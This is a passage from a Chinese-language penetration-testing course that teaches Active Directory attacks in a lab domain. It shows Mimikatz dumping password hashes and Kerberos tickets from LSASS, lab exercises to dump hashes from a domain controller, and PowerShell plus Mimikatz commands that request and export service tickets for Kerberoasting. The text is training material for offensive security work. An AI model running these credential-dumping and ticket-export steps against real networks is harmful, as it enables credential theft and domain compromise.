
* 域		: CORP
* NTLM		: e2b475c11da2a074829d087aa966c327
* SHA1		: 8c77f430e4ab8acb010ead387d64011c76480d26e
* DPAPI		: 162d313bede93b0a2e72a030ec9216f0
tspkg		:
wdigest		:
* 用户名	: Offsec
* 域	: CORP
* 密码	: (null)
kerberos	:
* 用户名	: Offsec
* 域	: CORP.COM
* 密码	: (null)
...

列表 689 - 在域工作站上执行 mimikatz

上述输出片段显示了为域用户 Offsec 存储在 LSASS 中的所有凭据信息，包括缓存的哈希值。

请注意，上述输出中高亮显示了两类哈希值。这将根据 AD 实现的功能级别而有所不同。对于功能级别为 Windows 2003 的 AD 实例，NTLM 是唯一可用的哈希算法。对于运行 Windows Server 2008 或更高版本的实例，NTLM 和 SHA-1（AES 加密的常见伴侣）均可用。在 Windows 7 等较旧的操作系统上，或手动启用了该功能的操作系统上，WDigest,654 将被启用。当 WDigest 被启用时，运行 Mimikatz 将在密码哈希值旁边显示明文密码。

凭借这些哈希值，我们可以尝试破解它们以获得明文密码。

Mimikatz 的另一种用途是通过滥用 TGT 和服务票据来利用 Kerberos 认证。正如之前讨论的，我们知道当前登录到本地机器的用户的 Kerberos TGT 和服务票据会被存储以供将来使用。这些票据也存储在 LSASS 中，我们可以使用 Mimikatz 来交互并检索我们自己的票据以及其他本地用户的票据。

例如，在列表 690 中，我们使用 Mimikatz 显示存储在内存中的 Offsec 用户的票据：

```
mimikatz # sekurlsa::tickets
Authentication Id : 0 ; 291668 (00000000:00047354)
Session		: Interactive from 1
User Name		: Offsec
Domain		: CORP
Logon Server	: DC01
Logon Time	: 08/02/2018 14,23,26
SID		: S-1-5-21-1602875587-2787523311-2599479668-1103

* Username : Offsec
* Domain : CORP.COM
* Password : (null)
```

654 (Microsoft, 2003). https://technet.microsoft.com/en-us/library/yc778868(v=ws.10).aspx

![](img/ec25e59d75726b7041242a56d3376832_642_0.png)

![](img/ec25e59d75726b7041242a56d3376832_643_0.png)

组 0 – **票据授予服务**

```
[00000000]
[00000001]
[00000002]
```

```
Start/End/MaxRenew: 09/02/2018 14.41.47; 10/02/2018 00.41.47; 16/02/2018 14.41.47
Service Name (02): cifs ; dc01 ; @ CORP.COM
Target Name (02): cifs ; dc01 ; @ CORP.COM
Client Name (01): Offsec ; @ CORP.COM
Flags 40a50000 : name_canonicalize ; ok_as_delegate ; pre_authent ; renewable ;
Session Key: 0x00000012 - aes256_hmac
d062a1bc89c09544a7130652f4d4bae4c04833c3324aa2e1b1051816a7090a0718
Ticket: 0x00000012 - aes256_hmac ; kvno = 3
```

组 1 – 客户票据 ?

组 2 – **票据授予票据**

```
[00000000]
[00000001]
[00000002]
```

```
Start/End/MaxRenew: 09/02/2018 14.41.47; 10/02/2018 00.41.47; 16/02/2018 14.41.47
Service Name (02): krbtgt ; CORP.COM ; @ CORP.COM
Target Name (02): @ CORP.COM
Client Name (01): Offsec ; @ CORP.COM ($$Delegation Ticket$$)
Flags 60a10000 : name_canonicalize ; pre_authent ; renewable ; forwarded ; forwa
Session Key: 0x00000012 - aes256_hmac
3b0a49af17a1ada1dacf2e3b8964ad397d80270b7118cc567da4d4b2b6dc90d
Ticket: 0x00000012 - aes256_hmac ; kvno = 2

[00000001]
Start/End/MaxRenew: 09/02/2018 14.41.47; 10/02/2018 00.41.47; 16/02/2018 14.41.47
Service Name (02): krbtgt ; CORP.COM ; @ CORP.COM
Target Name (02): krbtgt ; CORP.COM ; @ CORP.COM
Client Name (01): Offsec ; @ CORP.COM ( CORP.COM )
Flags 40e10000 : name_canonicalize ; pre_authent ; initial ; renewable ; forward
Session Key: 0x00000012 - aes256_hmac
8f6e96a7067a86d94af4e9f46e0e2abd067422fe7b1588db37c199f56e91a749c
Ticket: 0x00000012 - aes256_hmac ; kvno = 2
```

列表 690 – 使用 mimikatz 提取 Kerberos 票据

输出显示了一个 TGT 和一个 TGS。窃取 TGS 将只允许我们访问与这些票据相关的特定资源。另一方面，凭借 TGT 票据，我们可以请求访问我们想要针对的域内特定资源的 TGS。我们稍后将在模块中讨论如何利用窃取或伪造的票据。

除了这些功能外，Mimikatz 还可以将票据导出到硬盘，并将票据导入 LSASS，我们将稍后探讨这一点。Mimikatz 甚至可以提取与通过智能卡和 PIN 进行认证相关的信息，这使得该工具成为真正的缓存凭据“瑞士军刀”！

### 21.3.3.1 练习

- 使用 Mimikatz 从学生虚拟机中转储所有密码哈希值。
- 通过远程桌面以 Jeff_Admin 账户登录域控制器，并使用 Mimikatz 从服务器中转储所有密码哈希值。

# 21.3.4 服务账户攻击

回想一下 Kerberos 协议的解释，我们知道当用户想要访问由 SPN 托管的资源时，客户端会请求由域控制器生成的服务票据。然后，由于服务票据是通过 SPN 的密码哈希值加密的，它会被应用程序服务器解密和验证。

在从域控制器请求服务票据时，不会对用户是否有权访问由服务主体名称托管的服务进行检查。这些检查仅在连接服务本身时作为第二步执行。这意味着，如果我们知道想要针对的 SPN，我们可以从域控制器请求针对它的服务票据。然后，由于这是我们自己的票据，我们可以将其从本地内存中提取并保存到磁盘。

在本节中，我们将滥用服务票据并尝试破解服务账户的密码。

例如，我们知道域中互联网信息服务 Web 服务器的注册 SPN 是 _HTTP/CorpWebServer.corp.com_。从 PowerShell 中，我们可以使用 KerberosRequestorSecurityToken 类 [655] 来请求服务票据。 [656]

我们需要代码片段位于 System.IdentityModel [657] 命名空间中，该命名空间默认未加载到 PowerShell 实例中。要加载它，我们使用带有 -AssemblyName 参数的 Add-Type [658] cmdlet。

我们可以通过指定带有 -ArgumentList 选项的 SPN 来调用 KerberosRequestorSecurityToken 构造函数，如列表 691 所示。

```
Add-Type -AssemblyName System.IdentityModel
New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList 'HTTP/CorpWebServer.corp.com'
```

列表 691 - 请求服务票据

执行后，请求的服务票据应由域控制器生成并加载到 Windows 10 客户端的内存中。而不是每次都执行 Mimikatz，我们还可以使用内置的 klist [659] 命令来显示当前用户的所有缓存的 Kerberos 票据：

```
PS C:\Users\offsec> klist

Current LogonId is 0x0x3d e df

Cached Tickets: (4)

# 0 > Client: Offsec @ CORP.COM
```

- 655 (Microsoft, 2017), https://msdn.microsoft.com/en-us/library/system.identitymodel.tokens.kerberosrequestorsecuritytoken(v=vs.110).aspx
- 656 (Sean Metcalf, 2016), https://adsecurity.org/?p=2293
- 657 (Microsoft, 2019), https://docs.microsoft.com/en-us/dotnet/api/system.identitymodel?view=netframework-4.8
- 658 (Microsoft, 2019), https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/add-type?view=powershell-6
- 659 (Microsoft, 2019), https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/klist

![](img/ec25e59d75726b7041242a56d3376832_645_0.png)

Server: krbtgt/CORP.COM @ CORP.COM
KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96
Ticket Flags 0x40e10000 -> forwardable renewable initial pre_authent name_canonicalize
Start Time: 2/12/2018 10:17:53 (local)
End Time: 2/12/2018 20:17:53 (local)
Renew Time: 2/19/2018 10:17:53 (local)
Session Key Type: AES-256-CTS-HMAC-SHA1-96
Cache Flags: 0x1 -> PRIMARY
Kdc Called: DC01.corp.com

#1> Client: Offsec @ CORP.COM
Server: HTTP/CorpWebServer.corp.com @ CORP.COM
KerbTicket Encryption Type: RSADSI RC4-HMAC(NT)
Ticket Flags 0x40a50000 -> forwardable renewable pre_authent ok_as_delegate name_canonicalize
Start Time: 2/12/2018 10:18:31 (local)
End Time: 2/12/2018 20:17:53 (local)
Renew Time: 2/19/2018 10:17:53 (local)
Session Key Type: RSADSI RC4-HMAC(NT)
Cache Flags: 0
Kdc Called: DC01.corp.com

列表 692 - 显示票据

在为互联网信息服务主体名称创建并保存到内存中的服务票据（列表 692）之后，我们可以使用内置 API $^{660}$ 或 Mimikatz 将其从内存中下载。

要使用 Mimikatz 下载服务票据，我们使用 `kerberos::list` 命令，该命令产生与上述 `klist` 命令等效的输出。我们还指定了 `/export` 标志以将其下载到磁盘，如列表 693 所示。

```
mimikatz # kerberos::list /export

[00000000] - 0x00000012 - aes256_hmac
Start/End/MaxRenew: 12/02/2018 10.17.53 ; 12/02/2018 20.17.53 ; 19/02/2018 10.17.53
Server Name : krbtgt/CORP.COM @ CORP.COM
Client Name : Offsec @ CORP.COM
Flags 40e10000 : name_canonicalize ; pre_authent ; initial ; renewable ; forward
\\ Saved to file : 0-40e10000-offsec@krbtgt-CORP.COM-CORP.COM.kirbi

[00000001] - 0x00000017 - rc4_hmac_nt
Start/End/MaxRenew: 12/02/2018 10.18.31 ; 12/02/2018 20.17.53 ; 19/02/2018 10.17.53
Server Name : HTTP/CorpWebServer.corp.com @ CORP.COM
Client Name : Offsec @ CORP.COM
Flags 40a50000 : name_canonicalize ; ok_as_delegate ; pre_authent ; renewable ;
\\ Saved to file : 1-40a50000-offsec@HTTP-CorpWebServer.corp.com-CORP.COM.kirbi
```

列表 693 - 从内存中导出票据

